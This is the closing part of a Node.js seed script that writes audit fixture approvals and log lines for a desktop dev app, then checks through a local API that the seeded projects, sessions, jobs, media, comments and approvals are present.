  const kept = existingApprovals.filter(
    (record) =>
      typeof record.id === "string" && !record.id.startsWith("audit-appr-"),
  );
  const approvals = [...kept, ...buildApprovalSeeds()];
  const approvalsTmp = `${approvalsPath}.tmp`;
  writeFileSync(approvalsTmp, `${JSON.stringify({ approvals }, null, 2)}\n`);
  renameSync(approvalsTmp, approvalsPath);
  ok(
    `wrote ${approvals.length - kept.length} audit approvals (${kept.length} pre-existing kept)`,
  );

  // --- Runtime logs (filesystem) ----------------------------------------------
  step("Appending runtime log lines");
  const logsDir = join(runtimeDir, "logs");
  mkdirSync(logsDir, { recursive: true });
  const logsPath = join(logsDir, "doolittle.jsonl");
  const marker = "Audit seed info: visual audit fixture content is present";
  const existingLog = existsSync(logsPath)
    ? readFileSync(logsPath, "utf8")
    : "";
  if (existingLog.includes(marker)) {
    skip("audit log lines already present");
  } else {
    for (const row of buildLogSeeds()) {
      appendFileSync(logsPath, `${JSON.stringify(row)}\n`);
    }
    ok(`appended ${buildLogSeeds().length} log lines`);
  }

  // --- Verification pass ------------------------------------------------------
  step("Verification pass");
  let failures = 0;
  const verify = async (label, path, extract, minimum) => {
    try {
      const payload = await apiStrict(apiBase, path);
      const count = extract(payload);
      if (count >= minimum) ok(`${label}: ${count}`);
      else {
        fail(`${label}: ${count} (expected at least ${minimum})`);
        failures += 1;
      }
    } catch (error) {
      fail(
        `${label}: ${error instanceof Error ? error.message : String(error)}`,
      );
      failures += 1;
    }
  };
  await verify(
    "projects (audit)",
    "/projects?includeArchived=true",
    (payload) =>
      (payload.projects ?? []).filter((project) =>
        project.id?.startsWith("audit-proj-"),
      ).length,
    2,
  );
  await verify(
    "sessions (audit)",
    "/sessions?limit=500",
    (payload) =>
      (payload.sessions ?? []).filter((session) =>
        Object.values(SESSION_TITLES).includes(session.title),
      ).length,
    3,
  );
  await verify(
    "automation jobs (audit)",
    "/cron/jobs",
    (payload) =>
      (payload.jobs ?? []).filter((job) => job.name?.startsWith("audit-"))
        .length,
    4,
  );
  await verify(
    "automation runs",
    "/cron/runs",
    (payload) => (payload.runs ?? []).length,
    1,
  );
  await verify(
    "media assets (audit)",
    "/media/library",
    (payload) =>
      (payload.assets ?? []).filter((asset) => asset.name?.startsWith("audit-"))
        .length,
    1,
  );
  await verify(
    "review comments (audit)",
    "/review-record",
    (payload) =>
      (payload.comments ?? []).filter((comment) =>
        comment.id?.startsWith("audit-comment-"),
      ).length,
    5,
  );
  await verify(
    "execution approvals (audit)",
    "/execution/approvals",
    (payload) =>
      (payload.approvals ?? []).filter((record) =>
        record.id?.startsWith("audit-appr-"),
      ).length,
    6,
  );

  console.log("");
  if (failures > 0) {
    fail(`${failures} verification check(s) below expectation — see above`);
    process.exitCode = 1;
  } else {
    console.log(
      "Seed complete. Reload the desktop dev app and audit the populated surfaces.",
    );
  }
}

main().catch((error) => {
  console.error(
    `\nseed-visual-audit failed: ${error instanceof Error ? error.message : String(error)}`,
  );
  process.exitCode = 1;
});
